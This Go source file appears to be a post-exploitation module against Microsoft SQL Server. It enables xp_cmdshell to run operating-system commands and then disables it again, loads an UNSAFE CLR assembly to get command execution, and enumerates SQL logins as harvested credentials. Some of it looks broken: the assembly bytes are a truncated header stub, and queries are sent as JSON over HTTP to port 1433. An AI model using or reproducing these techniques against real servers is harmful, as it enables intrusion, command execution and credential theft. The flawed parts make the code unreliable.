package dbpost

import (
	"encoding/json"
	"fmt"
	"strings"
)

type MSSQLExploit struct {
	config *DBPostConfig
	client *HTTPClient
}

func NewMSSQLExploit(config *DBPostConfig, client *HTTPClient) *MSSQLExploit {
	return &MSSQLExploit{
		config: config,
		client: client,
	}
}

func (m *MSSQLExploit) XPCmdShell(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueXPCmdShell

	enableQueries := []string{
		`EXEC sp_configure 'show advanced options', 1; RECONFIGURE`,
		`EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`,
	}

	var output strings.Builder
	for _, q := range enableQueries {
		_, err := m.executeQuery(creds, q)
		if err != nil {
			output.WriteString(fmt.Sprintf("[enable] Error: %v\n", err))
		}
	}

	commands := []string{"id", "whoami", "hostname", "ver"}
	for _, cmd := range commands {
		query := fmt.Sprintf(`EXEC xp_cmdshell '%s'`, cmd)
		resp, err := m.executeQuery(creds, query)
		if err != nil {
			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", cmd, err))
			continue
		}
		output.WriteString(fmt.Sprintf("[%s] Output: %s\n", cmd, resp))
	}

	disableQueries := []string{
		`EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE`,
		`EXEC sp_configure 'show advanced options', 0; RECONFIGURE`,
	}
	for _, q := range disableQueries {
		m.executeQuery(creds, q)
	}

	if output.Len() > 0 {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method":   "xp_cmdshell",
			"commands": len(commands),
		}
		return result, nil
	}

	return result, fmt.Errorf("xp_cmdshell failed")
}

func (m *MSSQLExploit) CLRAssembly(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueCLRAssembly

	assemblyName := "cmd_exec"
	className := "cmd_exec"
	methodName := "Run"

	assemblyHex := "0x4D5A90000300000004000000FFFF0000"

	queries := []struct {
		name  string
		query string
	}{
		{"enable_clr", "EXEC sp_configure 'clr enabled', 1; RECONFIGURE"},
		{"create_assembly", fmt.Sprintf(`CREATE ASsembly [%s] FROM %s WITH PERMISSION_SET = UNSAFE`, assemblyName, assemblyHex)},
		{"create_class", fmt.Sprintf(`CREATE PROCEDURE [dbo].[%s] @cmd NVARCHAR(MAX) AS EXTERNAL NAME [%s].[%s].[%s]`, className, assemblyName, className, methodName)},
		{"exec_cmd", fmt.Sprintf(`EXEC [dbo].[%s] 'id'`, className)},
	}

	var output strings.Builder
	for _, q := range queries {
		resp, err := m.executeQuery(creds, q.query)
		if err != nil {
			output.WriteString(fmt.Sprintf("[%s] Error: %v\n", q.name, err))
			continue
		}
		output.WriteString(fmt.Sprintf("[%s] OK: %s\n", q.name, resp))
	}

	if output.Len() > 0 {
		result.Success = true
		result.CmdOutput = output.String()
		result.Data = map[string]interface{}{
			"method": "clr_assembly",
		}
		return result, nil
	}

	return result, fmt.Errorf("clr assembly failed")
}

func (m *MSSQLExploit) SQLLogins(creds *DBCreds, result *PostExploitResult) (*PostExploitResult, error) {
	result.Technique = TechniqueSQLLogins

	query := `SELECT name, type_desc, is_disabled, default_database_name, loginname FROM sys.sql_logins`
	resp, err := m.executeQuery(creds, query)
	if err != nil {
		return result, fmt.Errorf("query failed: %w", err)
	}

	var credsList []CredentialEntry
	lines := strings.Split(resp, "\n")
	for _, line := range lines {
		parts := strings.Fields(line)
		if len(parts) >= 2 {
			cred := CredentialEntry{
				Username: parts[0],
				Role:     parts[1],
				Source:   "mssql_sql_logins",
			}
			credsList = append(credsList, cred)
		}
	}

	if len(credsList) > 0 {
		result.Success = true
		result.Credentials = credsList
		result.Data = map[string]interface{}{
			"method": "sql_logins_enumeration",
			"count":  len(credsList),
		}
		return result, nil
	}

	return result, fmt.Errorf("sql logins enumeration failed")
}

func (m *MSSQLExploit) executeQuery(creds *DBCreds, query string) (string, error) {
	target := BuildURL(m.config.Target, "/query", 1433)

	payload := fmt.Sprintf(`{
		"query": "%s",
		"user": "%s",
		"password": "%s",
		"database": "%s"
	}`, strings.ReplaceAll(query, `"`, `\"`), creds.Username, creds.Password, creds.Database)

	body := strings.NewReader(payload)
	_, resp, err := m.client.Post(target, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return "", fmt.Errorf("execute query: %w", err)
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) == nil {
		if data, ok := result["data"].(string); ok {
			return data, nil
		}
		if error, ok := result["error"].(string); ok {
			return "", fmt.Errorf("mssql error: %s", error)
		}
	}

	return string(resp), nil
}
